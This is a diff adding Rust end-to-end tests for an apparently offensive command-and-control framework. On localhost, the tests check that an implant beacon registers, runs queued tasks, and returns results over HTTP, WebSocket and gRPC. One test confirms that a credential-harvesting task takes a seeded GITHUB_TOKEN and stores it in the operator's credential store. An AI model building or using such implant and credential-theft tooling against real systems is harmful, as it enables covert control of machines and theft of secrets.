@@ -1380,3 +1380,239 @@ async fn m2_auth_audit_and_restart_persistence() {
             .any(|entry| entry.action == "task.shell" && !entry.succeeded)
     );
 }
+
+/// A completed `nw/creds` task round-trips: the implant harvests, the server
+/// ingests the JSON payload, and the operator listing returns it.
+#[tokio::test]
+async fn creds_harvest_ingests_into_the_credential_store() {
+    let _ = tracing_subscriber::fmt()
+        .with_max_level(tracing::Level::INFO)
+        .try_init();
+    let psk: Vec<u8> = b"creds-e2e-psk".to_vec();
+    let c2_port = free_port();
+    let endpoint = format!("http://127.0.0.1:{}", c2_port);
+
+    // Seed an environment-borne secret so the harvester has something to find.
+    // SAFETY: single-threaded e2e binary; restored at the end.
+    unsafe { std::env::set_var("GITHUB_TOKEN", "s3cr3t-e2e-value") };
+
+    let registry = Arc::new(SessionRegistry::new());
+    let queue = Arc::new(TaskQueue::new());
+    let creds = Arc::new(nw_server::creds::CredentialStore::new_in_memory());
+    let state = ServerState {
+        registry: registry.clone(),
+        queue: queue.clone(),
+        psk: Arc::new(psk.clone()),
+        files: nw_server::filestore::FileStore::default(),
+        uploads: nw_server::uploadstore::UploadStore::default(),
+        creds: creds.clone(),
+    };
+    let bind = format!("127.0.0.1:{}", c2_port);
+    let server_handle = tokio::spawn(async move { server::serve_with_bind(state, &bind).await });
+    tokio::time::sleep(Duration::from_millis(200)).await;
+
+    let profile = Profile {
+        endpoint: endpoint.clone(),
+        interval: Duration::from_millis(50),
+        jitter: Duration::ZERO,
+        hostname: "credslab".into(),
+        username: "tester".into(),
+        os: "test-os".into(),
+        arch: "test-arch".into(),
+        pid: 556,
+        addr: "127.0.0.1".into(),
+    };
+    let runtime = Arc::new(BeaconRuntime::new(profile, psk.clone()));
+    let implanted = runtime.clone();
+    let beacon = tokio::spawn(async move { implanted.run().await });
+
+    wait_for_session(&registry).await;
+    let sid = registry.list().await[0].id;
+
+    let task_id = queue
+        .push(&sid, "nw/creds".into(), vec![], 30_000)
+        .await
+        .expect("queued creds");
+    let result = wait_for_result(&queue, &sid, &task_id).await;
+    assert!(
+        result.ok,
+        "stderr: {}",
+        String::from_utf8_lossy(&result.stderr)
+    );
+
+    // The store should now hold the harvested environment secret.
+    let stored = creds.list(&sid.to_string()).await;
+    assert!(
+        stored.iter().any(|c| c.secret == "s3cr3t-e2e-value"),
+        "expected the seeded token in the store, got: {stored:?}"
+    );
+    assert!(
+        stored.iter().any(|c| c.source == "environment"),
+        "expected an environment-sourced credential"
+    );
+
+    runtime.trigger_stop();
+    let _ = beacon.await;
+    server_handle.abort();
+    unsafe { std::env::remove_var("GITHUB_TOKEN") };
+}
+
+/// A full beacon cycle over the persistent WebSocket transport.
+#[tokio::test]
+async fn websocket_c2_round_trip() {
+    let _ = tracing_subscriber::fmt()
+        .with_max_level(tracing::Level::INFO)
+        .try_init();
+    let psk: Vec<u8> = b"ws-e2e-psk".to_vec();
+    let c2_port = free_port();
+    let endpoint = format!("ws://127.0.0.1:{}", c2_port);
+
+    let registry = Arc::new(SessionRegistry::new());
+    let queue = Arc::new(TaskQueue::new());
+    let state = ServerState {
+        registry: registry.clone(),
+        queue: queue.clone(),
+        psk: Arc::new(psk.clone()),
+        files: nw_server::filestore::FileStore::default(),
+        uploads: nw_server::uploadstore::UploadStore::default(),
+        creds: Arc::new(nw_server::creds::CredentialStore::new_in_memory()),
+    };
+    let bind = format!("127.0.0.1:{}", c2_port);
+    let server_handle = tokio::spawn(async move { server::serve_with_bind(state, &bind).await });
+    tokio::time::sleep(Duration::from_millis(200)).await;
+
+    let profile = Profile {
+        endpoint: endpoint.clone(),
+        interval: Duration::from_millis(50),
+        jitter: Duration::ZERO,
+        hostname: "wslab".into(),
+        username: "tester".into(),
+        os: "test-os".into(),
+        arch: "test-arch".into(),
+        pid: 557,
+        addr: "127.0.0.1".into(),
+    };
+    let runtime = Arc::new(BeaconRuntime::new(profile, psk.clone()));
+    let implanted = runtime.clone();
+    let beacon = tokio::spawn(async move { implanted.run().await });
+
+    wait_for_session(&registry).await;
+    let sid = registry.list().await[0].id;
+
+    // Queue a hashes task; its result must travel back over the WebSocket.
+    let data = b"websocket transport proof\n";
+    let dir = std::env::temp_dir().join(format!("nw-ws-{}", std::process::id()));
+    std::fs::create_dir_all(&dir).ok();
+    let path = dir.join("target.bin");
+    std::fs::write(&path, data).unwrap();
+
+    let task_id = queue
+        .push(
+            &sid,
+            "nw/hashes".into(),
+            vec![path.to_str().unwrap().into()],
+            30_000,
+        )
+        .await
+        .expect("queued hashes");
+    let result = wait_for_result(&queue, &sid, &task_id).await;
+    assert!(
+        result.ok,
+        "stderr: {}",
+        String::from_utf8_lossy(&result.stderr)
+    );
+
+    use sha2::{Digest, Sha256};
+    let mut h = Sha256::new();
+    h.update(data);
+    let expect_hex: String = h.finalize().iter().map(|b| format!("{b:02x}")).collect();
+    let stdout = String::from_utf8_lossy(&result.stdout);
+    assert!(stdout.starts_with(&expect_hex), "stdout was: {stdout}");
+
+    runtime.trigger_stop();
+    let _ = beacon.await;
+    server_handle.abort();
+    std::fs::remove_file(&path).ok();
+    std::fs::remove_dir_all(&dir).ok();
+}
+
+/// The full C2 stack — register, poll, task dispatch, result delivery — over
+/// gRPC. This is the drop-in proof that the gRPC carrier is protocol-identical
+/// to HTTP: nothing but the endpoint differs from `http_c2_round_trip`.
+#[tokio::test]
+async fn grpc_c2_round_trip() {
+    let _ = tracing_subscriber::fmt()
+        .with_max_level(tracing::Level::INFO)
+        .try_init();
+    let psk: Vec<u8> = b"e2e-grpc-psk".to_vec();
+    let port = free_port();
+    // The implant speaks its own scheme; tonic rewrites it internally.
+    let endpoint = format!("grpc://127.0.0.1:{}", port);
+
+    let registry = Arc::new(SessionRegistry::new());
+    let queue = Arc::new(TaskQueue::new());
+    let state = ServerState {
+        registry: registry.clone(),
+        queue: queue.clone(),
+        psk: Arc::new(psk.clone()),
+        files: nw_server::filestore::FileStore::default(),
+        uploads: nw_server::uploadstore::UploadStore::default(),
+        creds: Arc::new(nw_server::creds::CredentialStore::new_in_memory()),
+    };
+
+    let addr: std::net::SocketAddr = format!("127.0.0.1:{port}").parse().unwrap();
+    let grpc_handle = nw_server::grpc::serve(state, addr)
+        .await
+        .expect("grpc listener");
+
+    let profile = Profile {
+        endpoint,
+        interval: Duration::from_millis(100),
+        jitter: Duration::ZERO,
+        hostname: "testlab".into(),
+        username: "tester".into(),
+        os: "test-os".into(),
+        arch: "test-arch".into(),
+        pid: 1234,
+        addr: "127.0.0.1".into(),
+    };
+    let runtime = Arc::new(BeaconRuntime::new(profile, psk.clone()));
+    let implanted = runtime.clone();
+    let beacon = tokio::spawn(async move { implanted.run().await });
+
+    wait_for_session(&registry).await;
+    let sid = registry.list().await[0].id;
+    let task_id = queue
+        .push(
+            &sid,
+            "printf".into(),
+            vec!["grpc-roundtrip-ok".into()],
+            5000,
+        )
+        .await
+        .expect("queued");
+
+    let mut waited = Duration::ZERO;
+    let result = loop {
+        if let Some(r) = queue.take_result(&sid, &task_id).await {
+            break r;
+        }
+        assert!(
+            waited < Duration::from_secs(15),
+            "timed out waiting for gRPC task result"
+        );
+        tokio::time::sleep(Duration::from_millis(100)).await;
+        waited += Duration::from_millis(100);
+    };
+
+    assert!(
+        result.ok,
+        "stderr: {}",
+        String::from_utf8_lossy(&result.stderr)
+    );
+    assert_eq!(String::from_utf8_lossy(&result.stdout), "grpc-roundtrip-ok");
+
+    runtime.trigger_stop();
+    let _ = beacon.await;
+    grpc_handle.abort();
+}
